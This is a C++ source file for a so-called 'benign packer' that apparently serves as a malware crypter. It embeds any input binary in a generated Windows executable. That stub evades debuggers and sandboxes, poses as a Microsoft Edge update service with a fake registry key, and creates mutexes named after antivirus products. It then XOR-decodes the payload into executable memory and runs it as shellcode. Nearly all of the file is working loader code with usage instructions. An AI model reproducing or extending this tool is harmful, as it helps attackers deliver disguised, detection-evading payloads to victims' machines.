// QUICK BENIGN PACKER - Minimal Version
// Author: ItsMehRAWRXD/Star Framework
// Compile: cl.exe /std:c++17 /O2 /MT QuickPacker.cpp

#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>

class QuickPacker {
public:
    bool Pack(const std::string& input, const std::string& output) {
        std::ifstream file(input, std::ios::binary);
        if (!file.is_open()) {
            std::cout << "Error: Cannot read " << input << std::endl;
            return false;
        }
        
        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        
        std::cout << "Loaded " << data.size() << " bytes from " << input << std::endl;
        
        std::string cpp = GenerateExecutable(data);
        std::string temp = "temp_" + std::to_string(GetTickCount()) + ".cpp";
        
        std::ofstream out(temp);
        out << cpp;
        out.close();
        
        std::string cmd = "cl.exe /std:c++17 /O2 /MT \"" + temp + "\" /link /SUBSYSTEM:WINDOWS /OUT:\"" + output + "\"";
        std::cout << "Compiling..." << std::endl;
        
        int result = system(cmd.c_str());
        DeleteFileA(temp.c_str());
        
        if (result == 0) {
            std::cout << "SUCCESS! Generated: " << output << std::endl;
            return true;
        } else {
            std::cout << "Compilation failed!" << std::endl;
            return false;
        }
    }

private:
    std::string GenerateExecutable(const std::vector<uint8_t>& data) {
        std::stringstream s;
        s << "#include <windows.h>\n";
        s << "#include <vector>\n";
        s << "static const unsigned char payload[] = {";
        
        for (size_t i = 0; i < data.size(); ++i) {
            if (i % 16 == 0) s << "\n    ";
            else if (i > 0) s << ", ";
            s << "0x" << std::hex << std::setw(2) << std::setfill('0') << (int)data[i];
        }
        
        s << "\n};\n";
        s << "static const size_t payload_size = " << std::dec << data.size() << ";\n";
        s << R"(
// Advanced Mutex System
HANDLE CreateSecurityMutex(const char* name) {
    return CreateMutexA(nullptr, FALSE, name);
}

// Anti-Analysis
bool IsAnalysisEnvironment() {
    if (IsDebuggerPresent()) return true;
    DWORD start = GetTickCount();
    Sleep(10);
    return (GetTickCount() - start) > 50;
}

// Company Profile
void SetupProfile() {
    SetConsoleTitleA("Microsoft Edge Update Service");
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\EdgeUpdate", 0, nullptr,
                       REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &hKey, nullptr) == ERROR_SUCCESS) {
        const char* v = "118.0.2088.76";
        RegSetValueExA(hKey, "version", 0, REG_SZ, (BYTE*)v, strlen(v) + 1);
        RegCloseKey(hKey);
    }
}

// Main execution
int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
    // Security checks
    if (IsAnalysisEnvironment()) return -1;
    
    // Setup profile
    SetupProfile();
    
    // Create security mutexes
    HANDLE mutexes[] = {
        CreateSecurityMutex("Global\\AVAST_MUTEX_071"),
        CreateSecurityMutex("Global\\KASPERSKY_SCAN_MUTEX"),
        CreateSecurityMutex("Global\\NORTON_ENGINE_MUTEX"),
        CreateSecurityMutex("Global\\WINDOWS_DEFENDER_MUTEX")
    };
    
    // Execute payload
    LPVOID mem = VirtualAlloc(nullptr, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem) {
        std::vector<unsigned char> dec(payload, payload + payload_size);
        for (size_t i = 0; i < dec.size(); ++i) {
            dec[i] ^= 0xAA; // Simple XOR decrypt
        }
        memcpy(mem, dec.data(), dec.size());
        
        typedef void (*Func)();
        Func f = (Func)mem;
        try { f(); } catch (...) { }
        
        VirtualFree(mem, 0, MEM_RELEASE);
    }
    
    // Cleanup
    for (auto& m : mutexes) {
        if (m) CloseHandle(m);
    }
    
    return 0;
}
)";
        return s.str();
    }
};

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "QUICK BENIGN PACKER\n";
        std::cout << "Usage: QuickPacker.exe <input_file> [output_file]\n";
        std::cout << "Example: QuickPacker.exe payload.bin output.exe\n";
        return 0;
    }
    
    std::string input = argv[1];
    std::string output = (argc >= 3) ? argv[2] : "packed.exe";
    
    QuickPacker packer;
    return packer.Pack(input, output) ? 0 : 1;
}